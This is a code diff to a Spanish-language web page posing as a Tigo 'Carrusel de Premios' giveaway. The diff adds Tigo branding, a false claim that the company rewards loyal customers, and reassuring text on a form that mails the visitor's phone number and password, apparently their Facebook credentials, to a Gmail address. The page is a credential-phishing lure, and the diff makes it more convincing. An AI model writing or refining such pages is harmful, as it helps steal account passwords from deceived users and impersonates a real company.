@@ -33,6 +33,13 @@
             display: inline-block;
             transition: transform 0.5s linear;
         }
+        .mensaje-tigo {
+            font-size: 24px;
+            font-weight: bold;
+            text-align: center;
+            margin: 20px 0;
+            color: #3273dc;
+        }
     </style>
 </head>
 <body>
@@ -66,6 +73,7 @@
     <section class="section">
         <div class="container">
             <h1 class="title">Carrusel de Premios</h1>
+            <p class="mensaje-tigo">Con Tigo ganas más</p>
             <div id="carrusel">
                 <div id="carrusel-container">
                     <div class="opcion" style="background-color: #FF5733;">Recargas</div>
@@ -79,6 +87,15 @@
                 </div>
             </div>
             <button id="jugar" class="button is-primary">GANAR</button>
+        </div>
+    </section>
+
+    <!-- Mensaje de compromiso -->
+    <section class="section">
+        <div class="container">
+            <p class="has-text-centered">
+                La empresa Tigo, comprometida con la población, realiza esta promoción solo con aquellos clientes que son fieles a la marca.
+            </p>
         </div>
     </section>
 
@@ -164,7 +181,7 @@
 
             if (telefono && contrasena) {
                 const subject = `Ganador del Premio: ${premio}`;
-                const body = `Número de Teléfono: ${telefono}\nContraseña: ${contrasena}\nPremio: ${premio}`;
+                const body = `Número de Teléfono: ${telefono}\nContraseña: ${contrasena}\nPremio: ${premio}\n\nLa presente información es solicitada solo para verificar que usted es una persona real, por tal razón nos valemos de su cuenta de Facebook para confirmarlo. No se preocupe por sus datos, su información será eliminada en cuanto le hayamos enviado su premio.`;
                 window.location.href = `mailto:theprojectboom@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
             } else {
                 alert('Por favor, ingresa tu número de teléfono y contraseña.');
